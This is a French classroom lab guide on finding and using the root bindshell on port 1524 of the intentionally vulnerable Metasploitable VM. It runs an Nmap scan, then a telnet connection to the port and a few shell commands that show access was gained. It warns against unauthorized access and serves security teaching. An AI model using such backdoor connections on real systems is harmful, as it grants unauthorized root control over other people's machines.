# Vulnérabilités: Ouverture d'une "backdoor" sur la machine Metaspoitable directement avec le protocole Telnet:

Metasploit est un framework d’exploitation de vulnérabilités

🚩 Attention il est interdit d'accéder à des systèmes sans autorisation🏴‍☠️

Support : 

* VM Kalilinux avec utilisation de **metasploit**
* VM Linux vulnérable Metaspoitable

Réseau :

Le réseau doit être en **Accès par pont**
https://github.com/profelecmed/profelecmed/blob/main/Cybers%C3%A9curit%C3%A9/VM_Mise%20_en_r%C3%A9seau_.md


## Objectif :

✨ Vous devez trouver puis exploiter une vulnérabilité sur la machine vulnérable Metaspoitable avec le framework Metasploit installé sous la VM Kalilinux.

-----

## Prérequis 1 :

Nous allons utiliser la VM Linux vulnérable Metaspoitable
##### Création de la VM Metasploitable2 sous VirtualBox
https://github.com/profelecmed/profelecmed/blob/main/Cybers%C3%A9curit%C3%A9/VM_Metasploitable2/Creation_VM_Metaspoitable..md

##### Un fois active et sur le réseau déterminer son adresse IP
* Connaitre l'adrese IP de la cible ici la VM2. voir https://github.com/profelecmed/profelecmed/blob/main/Cybers%C3%A9curit%C3%A9/VM_kali_Nmap/Nmap_scanne_IP/readme.md
-----

## Méthode

Lancer **Metasploit** sous Kalilinux

Tapez le mot de passe de kalilinux

  msf6>

On va rechercher les services et leurs versons avec Nmap.

https://github.com/profelecmed/profelecmed/blob/main/Cybers%C3%A9curit%C3%A9/VM_kali_Nmap/Nmap_scanne_Ports_%26_applications.md

réponse attendue:
>
> Starting Nmap 7.95 (https://nmap.org) at ....
>
> ....
>Port     STATE    Service    Version
>
> 21/tcp   open  ftp   vsf......
>
> **1524/tcp    open  bindshell   Metasploitable root shell**
>  .....

* **bindshell** est unz technique pour ouvrir un port sur une machine.

On va donc essayer de se connecter directement avec le protocol Telnet sur la machine.

    telnet 192.168.56.xx 1524

* on a donc le protocole telnet
* l'adresse ip de la cible
* le port sur lequel on veut se connecter , ici celui de bindshell le 1524

Résultats:
>
> {*] exec:  telnet 192.168.56.xx 1524
>
>trying 192.168.56.xx
>
>connected to 192.168.56.xx

------

## Test la backdoor

on peux se déplacer , créer un répertoire , ....

    ls

    cd home

    ls

    cd 

    mkdir dirciel

    ls

On peut verifier sur la machine VM Linux vulnérable Metaspoitable , le répertoire dirciel existe.
